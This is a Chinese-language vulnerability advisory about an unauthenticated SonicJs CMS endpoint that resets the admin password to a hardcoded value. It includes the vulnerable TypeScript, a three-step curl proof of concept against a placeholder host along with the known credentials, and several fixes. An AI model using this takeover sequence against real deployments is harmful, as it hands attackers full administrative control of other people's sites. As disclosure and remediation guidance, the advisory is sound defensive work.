# SONIC-2025-001: 未认证 /auth/seed-admin 端点导致管理员账户接管

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | Critical |
| **CVSS 3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-287 (Improper Authentication) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/未认证 |

## 漏洞概述

SonicJs CMS 的 `/auth/seed-admin` 端点本意用于开发环境初始化管理员账户，但在生产部署中**没有任何环境检查或认证保护**。任何未认证的远程攻击者都可以调用此端点：

1. 如果管理员账户不存在 → 创建一个已知凭据的 admin 用户
2. 如果管理员账户已存在 → **直接重置其密码为硬编码值**

这意味着任何部署了 SonicJs 的实例都可能被远程接管。

## 影响范围

所有使用 SonicJs 的 Cloudflare Workers 部署实例。

## 漏洞代码

**文件**: `packages/core/src/routes/auth.ts` (第714-780行)

```typescript
// Test seeding endpoint (only for development/testing)  ← 注释说仅用于开发测试
authRoutes.post('/seed-admin',
  rateLimit({ max: 10, windowMs: 60 * 1000, keyPrefix: 'seed-admin' }),
  async (c) => {
  try {
    const db = c.env.DB
    
    // ... 创建 users 表 ...
    
    // 检查 admin 是否已存在
    const existingAdmin = await db.prepare('SELECT id FROM users WHERE email = ? OR username = ?')
      .bind('admin@sonicjs.com', 'admin')
      .first()

    if (existingAdmin) {
      // ⚠️ 如果已存在，直接重置密码为已知值！
      const passwordHash = await AuthManager.hashPassword('sonicjs!')
      await db.prepare('UPDATE users SET password_hash = ?, updated_at = ? WHERE id = ?')
        .bind(passwordHash, Date.now(), existingAdmin.id)
        .run()

      return c.json({
        message: 'Admin user already exists (password updated)',
        user: { id: existingAdmin.id, email: 'admin@sonicjs.com', ... }
      })
    }

    // 创建新 admin 用户，密码为 'sonicjs!'
    const passwordHash = await AuthManager.hashPassword('sonicjs!')
    // ...
```

**关键问题**:
- 无 `if (c.env.ENVIRONMENT === 'production') return c.json({error: 'Not available'}, 403)` 检查
- 无 `requireAuth()` 中间件
- 仅有 rate limit (10次/分钟) —— 但攻击只需要 1 次请求
- 已知凭据: `admin@sonicjs.com` / `sonicjs!`

## PoC (概念验证)

```bash
# 步骤1: 创建/重置 admin 账户
curl -X POST https://target-sonicjs-instance.workers.dev/auth/seed-admin

# 响应（无论是新建还是重置）:
# {"message":"Admin user already exists (password updated)",
#  "user":{"id":"admin-user-id","email":"admin@sonicjs.com","username":"admin","role":"admin"}}

# 步骤2: 用已知密码登录
curl -X POST https://target-sonicjs-instance.workers.dev/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sonicjs.com","password":"sonicjs!"}'

# 响应: {"user":{...,"role":"admin"}, "token":"eyJ..."}

# 步骤3: 以 admin 身份操作
curl -H "Authorization: Bearer <token>" \
  https://target-sonicjs-instance.workers.dev/admin/dashboard
```

## 修复建议

### 方案1（推荐）：环境检查 + 认证
```typescript
authRoutes.post('/seed-admin', async (c) => {
  // 仅在开发环境允许
  if (c.env.ENVIRONMENT === 'production') {
    return c.json({ error: 'This endpoint is disabled in production' }, 403)
  }
  
  // 可选：仅允许本地访问
  const ip = c.req.header('cf-connecting-ip')
  if (ip !== '127.0.0.1' && ip !== '::1') {
    return c.json({ error: 'Local access only' }, 403)
  }
  
  // ... existing logic ...
})
```

### 方案2：完全移除
```typescript
// 将 seed-admin 逻辑移到 CLI 工具或 wrangler script 中，不暴露为 HTTP 端点
```

### 方案3（最小修改）：仅允许首次使用
```typescript
authRoutes.post('/seed-admin', async (c) => {
  const db = c.env.DB
  const userCount = await db.prepare('SELECT COUNT(*) as count FROM users').first()
  if (userCount && userCount.count > 0) {
    return c.json({ error: 'Seed endpoint is only available for fresh installations' }, 403)
  }
  // ... existing logic ...
})
```

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-05-19 | 通过白盒审计发现漏洞 |
| 待定 | 向 SonicJs 团队报告 |
| 待定 | 修复发布 |

## 参考

- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [OWASP: Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
